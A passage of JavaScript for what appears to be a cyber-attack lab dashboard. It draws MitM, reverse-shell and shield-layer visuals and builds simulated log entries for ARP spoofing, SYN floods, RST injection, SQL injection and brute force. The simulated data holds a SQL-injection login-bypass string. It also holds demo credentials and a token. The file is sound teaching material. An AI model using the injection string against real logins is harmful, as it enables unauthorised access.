    ctx.fillStyle = '#DC2626';
    ctx.textAlign = 'center';
    ctx.fillText('✕ DIRECT LINK BYPASSED (ARP POISONED)', (cX + sX) / 2, (cY + sY) / 2 - 12);
    ctx.restore();

    // Đường truyền BẺ GÓC đi vòng qua Node Hacker (Client -> Hacker -> Server) có mũi tên chỉ hướng
    drawDirectionalLane(cX, cY, hX, hY, '#D97706', [6, 4], 2.2);
    drawDirectionalLane(hX, hY, sX, sY, '#D97706', [6, 4], 2.2);

    ctx.save();
    ctx.font = '800 10.5px "JetBrains Mono", monospace';
    ctx.fillStyle = '#92400E';
    ctx.textAlign = 'center';
    ctx.fillText('① MITM INTERCEPT', (cX + hX) / 2 - 28, (cY + hY) / 2 + 14);
    ctx.fillStyle = '#D97706';
    ctx.fillText('② RELAY TO SERVER', (hX + sX) / 2 + 32, (hY + sY) / 2 + 14);
    ctx.restore();
  } else {
    // Phong cách Protocol Explorer: Đường nối đôi song song hai chiều nét đứt (stroke #94A3B8 / #BCCAE6, dash 6,5) kèm mũi tên
    drawDirectionalLane(cX, cY - 7, sX, sY - 7, '#94A3B8', [6, 5], 1.85);
    drawDirectionalLane(sX, sY + 7, cX, cY + 7, '#BCCAE6', [6, 5], 1.65);

    // Đường nối từ Hacker -> Target Server (song song 2 làn Request/Response)
    drawDirectionalLane(hX - 5, hY - 5, sX - 5, sY + 12, '#94A3B8', [6, 5], 1.85);
    drawDirectionalLane(sX + 5, sY + 18, hX + 5, hY + 2, '#BCCAE6', [6, 5], 1.5);
  }

  // Khi công tắc Khiên phòng thủ BẬT: vẽ bức tường chắn nét liền màu xanh Cobalt #1D4ED8 trước Target Server
  const l3AnyActive = Boolean(
    state.defenseL3Active ||
      (typeof state.defenseL3Active === 'boolean' &&
        (state.defenseL3Subflags.anti_sqli ||
          state.defenseL3Subflags.rate_limit ||
          state.defenseL3Subflags.input_sanitization)),
  );
  const anyShieldActive = Boolean(state.defenseL1Active || state.defenseL2Active || l3AnyActive);

  if (anyShieldActive) {
    ctx.save();
    const activeLayers = [
      state.defenseL1Active ? { radius: SHIELD_RADII.L1_NETWORK, tag: 'L1' } : null,
      state.defenseL2Active ? { radius: SHIELD_RADII.L2_OS, tag: 'L2' } : null,
      l3AnyActive ? { radius: SHIELD_RADII.L3_APP, tag: 'L3' } : null,
    ].filter(Boolean);

    for (const layer of activeLayers) {
      ctx.beginPath();
      ctx.strokeStyle = '#1D4ED8';
      ctx.lineWidth = 2.4;
      ctx.setLineDash([]);
      ctx.arc(sX, sY, layer.radius, Math.PI * 0.58, Math.PI * 1.42);
      ctx.stroke();
    }

    // Bức tường chắn thẳng đứng nét liền màu xanh Cobalt #1D4ED8 ngay phía trước mặt Target Server
    const wallX = sR.left - wrapRect.left - 18;
    const wallTop = sY - 58;
    const wallBottom = sY + 58;
    ctx.beginPath();
    ctx.strokeStyle = '#1D4ED8';
    ctx.lineWidth = 3.5;
    ctx.setLineDash([]);
    ctx.moveTo(wallX, wallTop);
    ctx.lineTo(wallX, wallBottom);
    ctx.stroke();

    ctx.font = '800 10px "JetBrains Mono", monospace';
    ctx.fillStyle = '#0B3AA8';
    ctx.textAlign = 'right';
    ctx.fillText('COBALT SHIELD WALL [ACTIVE]', wallX - 6, wallTop - 6);
    ctx.restore();
  }

  // W4-T1: Vẽ đường kết nối Reverse Shell NGƯỢC từ Target Server (.20) về Hacker (.66)
  if (state.osL7State && state.osL7State.reverse_shell && state.osL7State.reverse_shell.active) {
    ctx.save();
    ctx.beginPath();
    ctx.strokeStyle = '#DC2626';
    ctx.lineWidth = 2.5;
    ctx.setLineDash([8, 5]);
    const ctrlX = (sX + hX) / 2 + 45;
    const ctrlY = (sY + hY) / 2 + 28;
    ctx.moveTo(sX, sY);
    ctx.quadraticCurveTo(ctrlX, ctrlY, hX, hY);
    ctx.stroke();

    // Vẽ mũi tên chỉ chiều từ Server -> Hacker tại điểm giữa đường cong
    const midX = 0.25 * sX + 0.5 * ctrlX + 0.25 * hX;
    const midY = 0.25 * sY + 0.5 * ctrlY + 0.25 * hY;
    const angle = Math.atan2(hY - sY, hX - sX);
    ctx.setLineDash([]);
    ctx.fillStyle = '#DC2626';
    ctx.beginPath();
    ctx.moveTo(midX + Math.cos(angle) * 9, midY + Math.sin(angle) * 9);
    ctx.lineTo(midX + Math.cos(angle + 2.5) * 8, midY + Math.sin(angle + 2.5) * 8);
    ctx.lineTo(midX + Math.cos(angle - 2.5) * 8, midY + Math.sin(angle - 2.5) * 8);
    ctx.closePath();
    ctx.fill();

    // Nhãn đường kết nối Reverse Shell ngược
    ctx.font = '800 10.5px "JetBrains Mono", monospace';
    ctx.fillStyle = '#991B1B';
    ctx.textAlign = 'center';
    const port = state.osL7State.reverse_shell.hacker_port || 4444;
    ctx.fillText(`🐚 REVERSE SHELL (SERVER ➔ HACKER:${port})`, midX + 35, midY + 18);
    ctx.restore();
  }
}

function updateAndDrawParticles() {
  for (let i = particles.length - 1; i >= 0; i--) {
    const p = particles[i];
    p.progress += p.speed;

    if (p.recoil) {
      // Hạt độc hại bị Khiên Chắn đánh bật và dội ngược/tan biến về phía Hacker!
      const t = Math.min(1, p.progress);
      p.x = p.startX + (p.targetX - p.startX) * t;
      p.y = p.startY + (p.targetY - p.startY) * t - Math.sin(t * Math.PI) * 18;
      if (p.progress >= 1) {
        particles.splice(i, 1);
        continue;
      }
      ctx.save();
      ctx.globalAlpha = Math.max(0.08, 1 - t * 0.92);
      ctx.beginPath();
      ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
      ctx.fillStyle = p.color;
      ctx.fill();
      ctx.restore();
      continue;
    }

    if (p.mitmRelay) {
      // Chuyển động thẳng sắc nét trên đường truyền bẻ góc Client -> Hacker -> Server
      const t = Math.min(1, p.progress);
      p.x = p.startX + (p.targetX - p.startX) * t;
      p.y = p.startY + (p.targetY - p.startY) * t + Math.sin(t * Math.PI) * p.spread;
    } else {
      // Đường cong Bezier
      const cpY = (p.startY + p.targetY) / 2 - 20 + p.spread;
      const cpX = (p.startX + p.targetX) / 2;

      const t = p.progress;
      p.x = (1 - t) * (1 - t) * p.startX + 2 * (1 - t) * t * cpX + t * t * p.targetX;
      p.y = (1 - t) * (1 - t) * p.startY + 2 * (1 - t) * t * cpY + t * t * p.targetY;
    }

    // W5-T1: KIỂM TRA VA CHẠM TẠI ĐÚNG LỚP KHIÊN CHẮN TƯƠNG ỨNG (L1 OUTER 152px / L2 MIDDLE 126px / L3 INNER 98px)
    const isMaliciousParticle = p.type === 'ATTACK' || p.type === 'ARP_SPOOF' || p.type === 'RST_INJECTION';
    if (isMaliciousParticle) {
      const shieldMatch = resolveBlockingShieldLayer(p.tag);
      const distToTarget = Math.hypot(p.targetX - p.x, p.targetY - p.y);
      if (shieldMatch && distToTarget <= shieldMatch.radius) {
        // Gói tin độc hại bị chặn đứng và dội ngược lại tại đúng lớp khiên tương ứng!
        spawnShieldDeflection(p.x, p.y, shieldMatch.color, shieldMatch.label, {
          x: p.startX,
          y: p.startY,
        });
        particles.splice(i, 1);
        continue;
      }
    }

    // Đã chạm đích của chặng hiện tại
    if (p.progress >= 1) {
      // Nếu là gói tin MitM vừa tới Node Hacker (chặng 1) -> Bẻ góc chuyển tiếp sang Server (chặng 2)
      if (p.mitmRelay && p.leg === 1) {
        p.leg = 2;
        p.progress = 0;
        p.startX = p.targetX;
        p.startY = p.targetY;
        p.targetX = p.finalTargetX;
        p.targetY = p.finalTargetY;
        p.color = '#D97706'; // Đổi sang màu cam cảnh báo gói tin đã bị Hacker đọc trộm!
        if (Math.random() > 0.55) {
          floatingLabels.push({
            x: p.startX - 55,
            y: p.startY - 18,
            text: '🕵️ SNIFFED CREDENTIALS!',
            alpha: 1,
            color: '#92400E',
          });
        }
        continue;
      }

      if (isMaliciousParticle && !resolveBlockingShieldLayer(p.tag)) {
        // Tấn công lọt qua các lớp khiên đang tắt -> Rung đỏ máy chủ
        triggerServerCompromisedVisual();
      }
      particles.splice(i, 1);
      continue;
    }

    // Vẽ hạt gói tin sắc nét trên nền sáng (không dùng hiệu ứng neon loè loẹt)
    ctx.save();
    ctx.beginPath();
    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
    ctx.fillStyle = p.color;
    ctx.fill();
    ctx.lineWidth = 1;
    ctx.strokeStyle = '#FFFFFF';
    ctx.stroke();
    ctx.restore();
  }
}

function spawnShieldDeflection(x, y, customColor = '#1D4ED8', customText = '🛡️ BLOCKED [L3]', bounceBackTarget = null) {
  // 1. Tạo hiệu ứng hạt gói tin vỡ/tan biến tại mặt tường chắn Cobalt #1D4ED8
  for (let i = 0; i < 8; i++) {
    shieldImpactSparks.push({
      x,
      y,
      vx: (Math.random() - 0.5) * 6,
      vy: (Math.random() - 0.5) * 6,
      color: i % 2 === 0 ? customColor : '#EF4444',
      alpha: 1,
      size: Math.random() * 2.2 + 1.5,
    });
  }

  // 2. W5-T1: Hiệu ứng hạt độc hại bị DỘI NGƯỢC & TAN BIẾN (Bounce-Back Recoil) bay trả về phía Hacker
  if (bounceBackTarget && Math.random() > 0.25) {
    const bounceX = x + (bounceBackTarget.x - x) * (0.45 + Math.random() * 0.35) + (Math.random() - 0.5) * 40;
    const bounceY = y + (bounceBackTarget.y - y) * (0.45 + Math.random() * 0.35) + (Math.random() - 0.5) * 30;
    particles.push({
      x,
      y,
      startX: x,
      startY: y,
      targetX: bounceX,
      targetY: bounceY,
      progress: 0,
      speed: 0.032 + Math.random() * 0.018,
      type: 'RECOIL',
      recoil: true,
      color: customColor,
      size: 2.8,
      tag: 'DEFLECTED',
      spread: 0,
    });
  }

  // 3. Thêm nhãn chữ nổi chỉ rõ Lớp Khiên nào vừa chặn đòn (L1 / L2 / L3)
  if (Math.random() > 0.32) {
    floatingLabels.push({
      x: x - 55,
      y: y - 10,
      text: customText,
      alpha: 1,
      color: customColor,
    });
  }
}

function triggerServerCompromisedVisual() {
  const server = document.getElementById('node-server');
  server.classList.add('compromised');
  setTimeout(() => {
    const revActive = Boolean(state.osL7State && state.osL7State.reverse_shell && state.osL7State.reverse_shell.active);
    if (!revActive) {
      server.classList.remove('compromised');
    }
  }, 400);
}

function updateAndDrawSparks() {
  for (let i = shieldImpactSparks.length - 1; i >= 0; i--) {
    const s = shieldImpactSparks[i];
    s.x += s.vx;
    s.y += s.vy;
    s.alpha -= 0.045;

    if (s.alpha <= 0) {
      shieldImpactSparks.splice(i, 1);
      continue;
    }

    const col = s.color || '#1D4ED8';
    ctx.save();
    ctx.globalAlpha = Math.max(0, s.alpha);
    ctx.beginPath();
    ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
    ctx.fillStyle = col;
    ctx.fill();
    ctx.restore();
  }
}

function updateAndDrawFloatingLabels() {
  for (let i = floatingLabels.length - 1; i >= 0; i--) {
    const l = floatingLabels[i];
    l.y -= 0.8;
    l.alpha -= 0.02;

    if (l.alpha <= 0) {
      floatingLabels.splice(i, 1);
      continue;
    }

    const col = l.color || '#1D4ED8';
    ctx.save();
    ctx.globalAlpha = Math.max(0, l.alpha);
    ctx.font = '700 11px "JetBrains Mono", monospace';
    ctx.fillStyle = col;
    ctx.fillText(l.text, l.x, l.y);
    ctx.restore();
  }
}

// ==========================================
// 5. PACKET TABLE RENDERING & FILTERING
// ==========================================
function renderTable() {
  const tbody = document.getElementById('packet-table-body');
  tbody.innerHTML = '';

  const filtered = state.logs.filter((log) => matchFilter(log));

  if (filtered.length === 0) {
    tbody.innerHTML = `
      <tr class="empty-row">
        <td colspan="9">No packets match current filter (${state.filterTag}).</td>
      </tr>
    `;
    return;
  }

  // Duyệt từ mới nhất tới cũ nhất
  for (let i = filtered.length - 1; i >= 0; i--) {
    const tr = createTableRow(filtered[i]);
    tbody.appendChild(tr);
  }
}

function appendTableRow(log) {
  appendTableRowBatch([log]);
}

function appendTableRowBatch(logs) {
  if (!Array.isArray(logs) || logs.length === 0) return;
  const matching = logs.filter((log) => matchFilter(log));
  if (matching.length === 0) return;

  const tbody = document.getElementById('packet-table-body');
  if (!tbody) return;
  const emptyRow = tbody.querySelector('.empty-row');
  if (emptyRow) emptyRow.remove();

  // Dùng DocumentFragment để gom toàn bộ các dòng trong 1 frame vào 1 thao tác DOM duy nhất (W6-T1)
  const fragment = document.createDocumentFragment();
  for (let i = matching.length - 1; i >= 0; i--) {
    fragment.appendChild(createTableRow(matching[i]));
  }
  tbody.insertBefore(fragment, tbody.firstChild);

  // Giới hạn số hàng trên DOM để tránh lag khi chạy bão SYN Flood
  while (tbody.children.length > state.maxLogs) {
    tbody.removeChild(tbody.lastChild);
  }

  // Tự động cuộn lên đầu nếu Auto-scroll bật
  if (state.autoScroll) {
    const container = document.getElementById('table-scroll-container');
    if (container) container.scrollTop = 0;
  }
}

function createTableRow(log) {
  const tr = document.createElement('tr');
  const isAttack = Boolean(log.is_suspicious || (log.attack_tag && log.attack_tag !== 'NORMAL'));
  if (isAttack) {
    tr.className = 'attack-row';
  }

  // Định dạng thời gian
  let timeStr = '--:--:--';
  if (log.timestamp) {
    const d = new Date(log.timestamp);
    timeStr = d.toTimeString().split(' ')[0] + '.' + String(d.getMilliseconds()).padStart(3, '0');
  }

  // Class cho HTTP Status
  let statusClass = 'status-2xx';
  if (log.status_code >= 500) statusClass = 'status-5xx';
  else if (log.status_code >= 400) statusClass = 'status-4xx';
  else if (log.status_code >= 300) statusClass = 'status-3xx';

  // Định dạng tóm tắt payload
  let payloadStr = '{}';
  if (typeof log.payload_summary === 'object' && log.payload_summary !== null) {
    payloadStr = JSON.stringify(log.payload_summary);
  } else if (typeof log.payload_summary === 'string') {
    payloadStr = log.payload_summary;
  }

  const tag = log.attack_tag || (isAttack ? 'ATTACK' : 'NORMAL');

  tr.innerHTML = `
    <td>${timeStr}</td>
    <td><span class="method-badge method-${escapeHtml(log.method)}">${escapeHtml(log.method)}</span></td>
    <td title="${escapeHtml(log.endpoint)}"><strong>${escapeHtml(log.endpoint)}</strong></td>
    <td><span class="status-badge ${statusClass}">${escapeHtml(log.status_code)}</span></td>
    <td>${escapeHtml(log.response_time)} ms</td>
    <td><code>${escapeHtml(log.client_ip)}</code></td>
    <td><span class="tag-badge tag-${escapeHtml(tag)}">${escapeHtml(tag)}</span></td>
    <td>${escapeHtml(log.defense_action || 'unknown')}</td>
    <td title="${escapeHtml(payloadStr)}">${truncate(escapeHtml(payloadStr), 25)}</td>
  `;

  // Nhấp vào hàng để xem JSON đầy đủ
  tr.addEventListener('click', () => {
    openInspectorModal(log);
  });

  return tr;
}

function matchFilter(log) {
  const isAttack = Boolean(log.is_suspicious || (log.attack_tag && log.attack_tag !== 'NORMAL'));
  const tag = log.attack_tag || (isAttack ? 'ATTACK' : 'NORMAL');

  // Lọc theo dropdown tag
  if (state.filterTag === 'ATTACK_ONLY' && !isAttack) return false;
  if (state.filterTag === 'NORMAL' && isAttack) return false;
  if (state.filterTag !== 'ALL' && state.filterTag !== 'ATTACK_ONLY' && tag !== state.filterTag) return false;

  // Lọc theo từ khóa tìm kiếm
  if (state.searchQuery) {
    const q = state.searchQuery.toLowerCase();
    const str = `${log.endpoint} ${log.method} ${log.client_ip} ${tag} ${log.status_code}`.toLowerCase();
    return str.includes(q);
  }

  return true;
}

// ==========================================
// 6. EVENT LISTENERS & USER ACTIONS
// ==========================================
function initEventListeners() {
  // W5-T1: Nút Toggle 3 Lớp Khiên Chắn (L1 Network, L2 OS, L3 App & L7 Sub-flags)
  const l1Btn = document.getElementById('btn-toggle-defense-l1');
  if (l1Btn) l1Btn.addEventListener('click', () => toggleDefenseLayer('l1'));
  const l2Btn = document.getElementById('btn-toggle-defense-l2');
  if (l2Btn) l2Btn.addEventListener('click', () => toggleDefenseLayer('l2'));
  document.getElementById('btn-toggle-defense').addEventListener('click', () => {
    toggleDefense();
  });

  const sqliChip = document.getElementById('btn-subflag-sqli');
  if (sqliChip) sqliChip.addEventListener('click', () => toggleDefenseSubFlag('anti_sqli'));
  const rlChip = document.getElementById('btn-subflag-ratelimit');
  if (rlChip) rlChip.addEventListener('click', () => toggleDefenseSubFlag('rate_limit'));
  const sanChip = document.getElementById('btn-subflag-sanitize');
  if (sanChip) sanChip.addEventListener('click', () => toggleDefenseSubFlag('input_sanitization'));

  // W6-T1: Nút "Reset Lab 1-Chạm" (1-Touch Reset Lab)
  document.getElementById('btn-reset-state').addEventListener('click', () => {
    triggerOneTouchLabReset();
  });

  const dismissResetBtn = document.getElementById('btn-dismiss-reset-toast');
  if (dismissResetBtn) {
    dismissResetBtn.addEventListener('click', () => {
      document.getElementById('reset-toast-banner').classList.add('hidden');
    });
  }

  // W6-ALL & W6-T1: Điều khiển Kill Chain 5 Giai đoạn & Stress Test SYN Flood Burst
  const kcPlayBtn = document.getElementById('btn-run-killchain');
  if (kcPlayBtn) kcPlayBtn.addEventListener('click', () => runAutoKillChain());

  const stressBtn = document.getElementById('btn-stress-syn-burst');
  if (stressBtn) stressBtn.addEventListener('click', () => runSynFloodStressBurst(120));

  const enableAllShieldsBtn = document.getElementById('btn-enable-all-shields');
  if (enableAllShieldsBtn) enableAllShieldsBtn.addEventListener('click', () => enableAllThreeShields());

  for (const stepBtn of document.querySelectorAll('[data-kc-trigger]')) {
    stepBtn.addEventListener('click', () => {
      const stageId = Number(stepBtn.getAttribute('data-kc-trigger'));
      executeKillChainStage(stageId);
    });
  }

  // Nút Auto-scroll
  const autoScrollBtn = document.getElementById('btn-toggle-autoscroll');
  autoScrollBtn.addEventListener('click', () => {
    state.autoScroll = !state.autoScroll;
    autoScrollBtn.textContent = `AUTO-SCROLL [${state.autoScroll ? 'ON' : 'OFF'}]`;
    autoScrollBtn.classList.toggle('active', state.autoScroll);
  });

  // Nút Clear Table (View Only)
  document.getElementById('btn-clear-table').addEventListener('click', () => {
    document.getElementById('packet-table-body').innerHTML = `
      <tr class="empty-row">
        <td colspan="9">View cleared. New incoming packets will be appended.</td>
      </tr>
    `;
  });

  // Ô tìm kiếm
  document.getElementById('log-search-input').addEventListener('input', (e) => {
    state.searchQuery = e.target.value.trim();
    renderTable();
  });

  // Dropdown lọc Tag
  document.getElementById('log-filter-tag').addEventListener('change', (e) => {
    state.filterTag = e.target.value;
    renderTable();
  });

  // Tắt Warning banner
  document.getElementById('btn-dismiss-warning').addEventListener('click', () => {
    document.getElementById('warning-banner').classList.add('hidden');
  });

  // Đóng Modal Inspector
  document.getElementById('btn-close-modal').addEventListener('click', closeModal);
  document.querySelector('.modal-backdrop').addEventListener('click', closeModal);

  // Quick Demo Traffic Buttons
  document.getElementById('btn-demo-ping').addEventListener('click', () => simulateTraffic('ping'));
  document.getElementById('btn-demo-user').addEventListener('click', () => simulateTraffic('normal-login'));
  document.getElementById('btn-demo-arp').addEventListener('click', () => simulateTraffic('arp-spoof'));
  document.getElementById('btn-demo-syn').addEventListener('click', () => simulateTraffic('syn-flood'));
  document.getElementById('btn-demo-rst').addEventListener('click', () => simulateTraffic('rst-inject'));
  document.getElementById('btn-demo-clean-arp').addEventListener('click', () => restoreCleanArp());
  document.getElementById('btn-demo-sqli').addEventListener('click', () => simulateTraffic('sqli'));
  document.getElementById('btn-demo-bruteforce').addEventListener('click', () => simulateTraffic('brute-force'));
  document.getElementById('btn-demo-revshell').addEventListener('click', () => simulateTraffic('reverse-shell'));
  document.getElementById('btn-demo-fd-exhaust').addEventListener('click', () => simulateTraffic('fd-exhaust'));
  document.getElementById('btn-demo-traversal').addEventListener('click', () => simulateTraffic('path-traversal'));
  document.getElementById('btn-demo-dos').addEventListener('click', () => simulateTraffic('dos'));
  document.getElementById('btn-demo-clean-os').addEventListener('click', () => restoreCleanOs());
}

async function restoreCleanOs() {
  try {
    await fetch('/api/telemetry/os', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'reset_os' }),
    });
  } catch {
    updateOsL7StateUI({
      ...state.osL7State,
      pstree: [
        {
          pid: 1,
          name: 'python3',
          cmd: 'python3 /app/target-entrypoint.py',
          user: 'root',
          suspicious: false,
          children: [
            { pid: 18, name: 'sshd', cmd: '/usr/sbin/sshd -D -e', user: 'root', suspicious: false },
            {
              pid: 24,
              name: 'node',
              cmd: 'node dist/main.js (Target Server :8000)',
              user: 'node',
              suspicious: false,
              children: [
                { pid: 31, name: 'sqlite3-worker', cmd: 'sqlite3 /data/target.sqlite', user: 'node', suspicious: false },
              ],
            },
          ],
        },
      ],
      suspicious_processes: [],
      reverse_shell: { ...state.osL7State.reverse_shell, active: false, shell_cmd: null, pid: null },
      fd_metrics: { ...state.osL7State.fd_metrics, open_fds: 42, peak_fds: 42, status: 'NORMAL', suspicious_files: [], process_count: 4 },
    });
  }
}

async function restoreCleanArp() {
  try {
    await fetch('/api/telemetry/network', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'reset_arp' }),
    });
  } catch {
    updateNetworkStateUI({
      ...state.networkState,
      mitm_active: false,
      arp_table: state.networkState.arp_table.map((e) => ({ ...e, mac: e.expected_mac || e.mac, spoofed: false })),
    });
  }
}

async function toggleDefenseLayer(layer) {
  const btnId = layer === 'l1' ? 'btn-toggle-defense-l1' : 'btn-toggle-defense-l2';
  const button = document.getElementById(btnId);
  if (button) button.disabled = true;
  try {
    const currentVal = layer === 'l1' ? state.defenseL1Active : state.defenseL2Active;
    const res = await fetch('/api/defense/toggle', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ layer, enabled: !currentVal }),
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.message || `Không thể đổi trạng thái khiên ${layer.toUpperCase()}.`);
    updateDefenseUI(data.defense_l3_app, data.defense_layers, data.current_state);
  } catch (error) {
    document.getElementById('defense-error').textContent = error.message;
  } finally {
    if (button) button.disabled = false;
  }
}

async function toggleDefenseSubFlag(flag) {
  try {
    const res = await fetch('/api/defense/toggle', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ layer: 'l3', flag }),
    });
    const data = await res.json();
    if (!res.ok || typeof data.defense_l3_app !== 'boolean') {
      throw new Error(data.message || 'Target chưa xác nhận trạng thái cờ con L7.');
    }
    updateDefenseUI(data.defense_l3_app, data.defense_layers, data.current_state);
  } catch (error) {
    document.getElementById('defense-error').textContent = error.message;
  }
}

async function toggleDefense() {
  const button = document.getElementById('btn-toggle-defense');
  button.disabled = true;
  try {
    const unknown = typeof state.defenseL3Active !== 'boolean';
    const res = await fetch(unknown ? '/api/defense/status' : '/api/defense/toggle', unknown ? {} : {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ layer: 'l3', enabled: !state.defenseL3Active }),
    });
    const data = await res.json();
    if (!res.ok || typeof data.defense_l3_app !== 'boolean') throw new Error(data.message || 'Target chưa xác nhận trạng thái.');
    updateDefenseUI(data.defense_l3_app, data.defense_layers, data.current_state);
  } catch (error) {
    updateDefenseUI(null);
    document.getElementById('defense-error').textContent = error.message;
  } finally {
    button.disabled = false;
  }
}

function renderAttackEvents() {
  const container = document.getElementById('attack-events');
  container.replaceChildren();
  if (!state.attackEvents.length) {
    container.textContent = 'Chưa nhận sự kiện Attacker. Chạy kịch bản từ Attacker Lab để xem sự kiện.';
    return;
  }
  for (const event of state.attackEvents.slice(-50).reverse()) {
    const details = document.createElement('details');
    const summary = document.createElement('summary');
    const step = event.payload.state || event.payload.stage || event.payload.type || event.event_type;
    summary.textContent = `${event.timestamp} | ${event.scenario}${event.execution_mode === 'simulated' ? ' · Mô phỏng' : ''} | ${step} | run ${event.run_id}`;
    const evidence = document.createElement('pre');
    evidence.textContent = JSON.stringify(event, null, 2);
    details.append(summary, evidence);
    container.append(details);
  }
}

// Modal Inspector
function openInspectorModal(log) {
  document.getElementById('modal-json-content').textContent = JSON.stringify(log, null, 2);
  document.getElementById('inspector-modal').classList.remove('hidden');
}

function closeModal() {
  document.getElementById('inspector-modal').classList.add('hidden');
}

// ==========================================
// 7. TRAFFIC SIMULATOR & CROSS-LAYER FUNNEL DEMO ASSISTANT (W5-T1 / W5-T3)
// ==========================================
async function simulateTraffic(type) {
  let logPayload = null;

  // Kiểm tra trạng thái chi tiết của từng Lớp Khiên (L1 Network, L2 OS, L3 App & L7 Sub-flags)
  const l1On = Boolean(state.defenseL1Active);
  const l2On = Boolean(state.defenseL2Active);
  const l3SqliOn = Boolean(
    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.anti_sqli),
  );
  const l3RateLimitOn = Boolean(
    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.rate_limit),
  );
  const l3SanitizerOn = Boolean(
    state.defenseL3Active || (typeof state.defenseL3Active === 'boolean' && state.defenseL3Subflags.input_sanitization),
  );

  if (type === 'ping') {
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'GET',
      endpoint: '/api/ping',
      status_code: 200,
      response_time: Math.floor(Math.random() * 8) + 2,
      client_ip: '192.168.1.10',
      payload_summary: { query: { t: Date.now() }, echo: 'ping-check' },
      attack_tag: 'NORMAL',
      is_suspicious: false,
      defense_action: 'allowed',
    };
  } else if (type === 'normal-login') {
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'POST',
      endpoint: '/api/auth/login',
      status_code: 200,
      response_time: Math.floor(Math.random() * 15) + 10,
      client_ip: '172.20.0.10',
      payload_summary: {
        body_preview: { username: 'engineer_user', password: 'pass123' },
        token_preview: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbmdpbmVlcl91c2VyIn0.signature',
      },
      attack_tag: 'NORMAL',
      is_suspicious: false,
      defense_action: 'allowed',
    };
  } else if (type === 'arp-spoof') {
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'ARP',
      endpoint: '/L2/arp-cache-poison (Gratuitous ARP Reply)',
      status_code: l1On ? 403 : 200,
      response_time: 1,
      client_ip: '172.20.0.66',
      payload_summary: {
        spoofed_ip: '172.20.0.20',
        spoofed_mac: '02:42:ac:14:00:42',
        l1_static_arp: l1On ? 'ENFORCED (PERMANENT NUD)' : 'DYNAMIC (VULNERABLE)',
        body_preview: { username: 'engineer_user', password: 'pass123' },
        token_preview: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbmdpbmVlcl91c2VyIn0.mitm_captured',
        detected_patterns: l1On ? ['BLOCKED_BY_L1_STATIC_ARP'] : ['ARP_CACHE_POISONING', 'MITM_HTTP_SNIFF'],
      },
      attack_tag: 'ARP_SPOOF',
      is_suspicious: true,
      defense_action: l1On ? 'blocked' : 'monitored',
    };
  } else if (type === 'syn-flood') {
    const synBlockedByL1 = l1On;
    const synMitigatedByL2 = !l1On && l2On;
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'TCP',
      endpoint: '/L4/tcp-syn-flood (Flags: SYN, Port: 8000, Rate: 150 pps)',
      status_code: synBlockedByL1 ? 429 : synMitigatedByL2 ? 200 : 503,
      response_time: synBlockedByL1 ? 4 : synMitigatedByL2 ? 18 : 420,
      client_ip: '172.20.0.66',
      payload_summary: {
        pps: 150,
        backlog_queue: synBlockedByL1
          ? 'L1_IPTABLES_SYN_LIMIT_DROPPED'
          : synMitigatedByL2
            ? 'L2_TCP_SYNCOOKIES_MITIGATED'
            : 'SYN_RECV_OVERFLOW',
        detected_patterns: ['HALF_OPEN_SYN_FLOOD'],
      },
      attack_tag: 'SYN_FLOOD',
      is_suspicious: true,
      defense_action: synBlockedByL1 ? 'rate_limited' : synMitigatedByL2 ? 'blocked' : 'monitored',
    };
  } else if (type === 'rst-inject') {
    const seqNum = Math.floor(200000000 + Math.random() * 700000000);
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'TCP',
      endpoint: `/L4/tcp-rst-injection (Flags: RST, SEQ=${seqNum})`,
      status_code: l1On ? 403 : 499,
      response_time: 2,
      client_ip: '172.20.0.66',
      payload_summary: {
        seq_num: seqNum,
        victim_ip: '172.20.0.10',
        target_ip: '172.20.0.20',
        l1_iptables_filter: l1On ? 'DROPPED_FORGED_RST' : 'BYPASSED',
        detected_patterns: ['FORGED_TCP_RST_PACKET'],
      },
      attack_tag: 'RST_INJECTION',
      is_suspicious: true,
      defense_action: l1On ? 'blocked' : 'monitored',
    };
  } else if (type === 'sqli') {
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'POST',
      endpoint: '/api/auth/login',
      status_code: l3SqliOn ? 401 : 200,
      response_time: Math.floor(Math.random() * 25) + 8,
      client_ip: '172.20.0.66',
      payload_summary: {
        body_preview: { username: "admin' OR '1'='1' --", password: '******' },
        cross_layer_note: l1On || l2On ? 'Passed L1/L2 (Valid TCP/HTTP) -> Inspected at L3' : 'Direct L7 Exploit',
        detected_patterns: ['SQL_INJECTION_AUTH_BYPASS'],
      },
      attack_tag: 'SQL_INJECTION',
      is_suspicious: true,
      defense_action: l3SqliOn ? 'sanitized' : 'allowed',
    };
  } else if (type === 'brute-force') {
    state.bruteForceCounter += 1;
    logPayload = {
      timestamp: new Date().toISOString(),
      method: 'POST',
      endpoint: '/api/auth/login',
      status_code: l3RateLimitOn ? 429 : 401,
      response_time: Math.floor(Math.random() * 14) + 6,
      client_ip: '172.20.0.66',
      payload_summary: {
        body_preview: { username: 'admin', password: `rockyou_pass_${state.bruteForceCounter}` },
        attempts_count: state.bruteForceCounter,
        rate_rps: 1,
        cross_layer_note: l1On ? 'Bypassed L1 iptables (Low-rate 1 req/s) -> Caught by L3 Token Bucket' : 'Low-rate 1 req/s',
        detected_patterns: ['LOW_RATE_BRUTE_FORCE_1RPS'],
      },
      attack_tag: 'BRUTE_FORCE',
      is_suspicious: true,
